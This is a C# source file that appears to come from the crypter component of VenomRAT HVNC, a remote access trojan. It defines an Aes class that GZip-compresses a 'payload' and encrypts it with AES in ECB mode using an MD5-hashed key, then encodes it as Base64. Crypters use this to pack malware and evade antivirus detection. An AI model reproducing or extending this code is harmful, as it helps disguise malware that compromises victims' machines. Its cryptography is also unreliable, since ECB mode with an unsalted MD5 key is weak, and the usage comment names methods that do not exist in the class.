using System;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;

namespace VenomRAT_HVNC.Crypter.Algorithms;

public class Aes
{
    //Use : Encryptions.AES_Encrypt(Encryptions.Compress(input),"key");
    public static string AesEncryptBytes(byte[] payload, string key)
    {
        AesManaged aes256 = new AesManaged();
        MD5CryptoServiceProvider hashAes = new MD5CryptoServiceProvider();
        byte[] decrypt;
        byte[] hash = hashAes.ComputeHash(Encoding.ASCII.GetBytes(key));
        aes256.Key = hash;
        aes256.Mode = CipherMode.ECB;
        byte[] buffer1 = payload;
        decrypt = aes256.CreateEncryptor().TransformFinalBlock(buffer1, 0, buffer1.Length);
        return Convert.ToBase64String(decrypt);
    }

    public static byte[] Compress(byte[] data)
    {
        MemoryStream memoryStream = new MemoryStream();
        GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true);
        gzipStream.Write(data, 0, data.Length);
        gzipStream.Close();
        memoryStream.Position = 0;
        byte[] compressedData = new byte[memoryStream.Length];
        memoryStream.Read(compressedData, 0, compressedData.Length);
        byte[] compressedBuffer = new byte[compressedData.Length + 4];
        Buffer.BlockCopy(compressedData, 0, compressedBuffer, 4, compressedData.Length);
        Buffer.BlockCopy(BitConverter.GetBytes(data.Length), 0, compressedBuffer, 0, 4);
        return compressedBuffer;
    }
}